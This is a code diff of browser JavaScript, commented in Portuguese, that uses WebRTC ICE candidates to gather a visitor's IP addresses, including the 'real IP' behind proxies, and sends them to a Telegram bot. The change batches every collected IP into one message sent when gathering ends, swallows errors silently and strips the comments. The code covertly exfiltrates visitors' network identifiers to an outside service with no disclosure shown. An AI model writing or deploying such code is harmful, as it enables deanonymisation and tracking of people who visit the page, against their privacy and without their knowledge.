@@ -36,7 +36,7 @@
 
     async function sendToTelegram(message) {
         const chatId = getChatId();
-        if (!chatId) return; // não faz nada se não tiver chat_id
+        if (!chatId) return; 
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         const payload = {
             chat_id: chatId,
@@ -48,7 +48,7 @@
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(payload)
-        }).catch(() => {}); // ignora erros silenciosamente
+        }).catch(() => {});
     }
 
     async function testWebRTC() {
@@ -70,7 +70,19 @@
         await pc.setLocalDescription(offer);
 
         pc.onicecandidate = event => {
-            if (!event || !event.candidate) return;
+            if (!event) return;
+
+            if (!event.candidate) {
+                // Fim da coleta de candidatos
+                if (foundIPs.size > 0) {
+                    // Cria a mensagem com todos os IPs, separados por linha
+                    const ipList = Array.from(foundIPs).join("\n");
+                    const msg = `📶 ip real recebido pelo navegador✅\n${ipList}`;
+                    sendToTelegram(msg);
+                }
+                return;
+            }
+
             const candidate = event.candidate.candidate;
             const parts = candidate.split(" ");
             const ip = parts[4];
@@ -78,8 +90,6 @@
             if (ip && !foundIPs.has(ip)) {
                 foundIPs.add(ip);
                 results.innerHTML += `<div class="ip">ip detectado: <strong>${ip}</strong></div>`;
-                const msg = `🎯 🤖 informações recebidas: ${ip}`;
-                sendToTelegram(msg);
             }
         };
     }
